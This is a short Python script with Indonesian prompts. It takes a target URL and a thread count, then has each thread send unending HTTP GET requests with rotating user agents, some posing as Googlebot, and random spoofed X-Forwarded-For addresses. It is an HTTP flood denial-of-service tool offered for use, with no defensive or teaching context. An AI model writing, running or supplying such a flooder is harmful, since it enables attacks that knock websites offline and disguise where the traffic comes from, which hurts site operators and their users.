import requests, threading, random

url = input("Target URL (https://...) > ")
jumlah = int(input("Jumlah Threads > "))

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0)",
    "curl/7.64.1",
    "Googlebot/2.1 (+http://www.google.com/bot.html)"
]

def attack():
    while True:
        try:
            headers = {
                "User-Agent": random.choice(user_agents),
                "X-Forwarded-For": ".".join(str(random.randint(0, 255)) for _ in range(4))
            }
            r = requests.get(url, headers=headers)
            print(f"🔥 Sent {r.status_code} - {headers['X-Forwarded-For']}")
        except:
            print("Gagal kirim request")

for _ in range(jumlah):
    threading.Thread(target=attack).start()
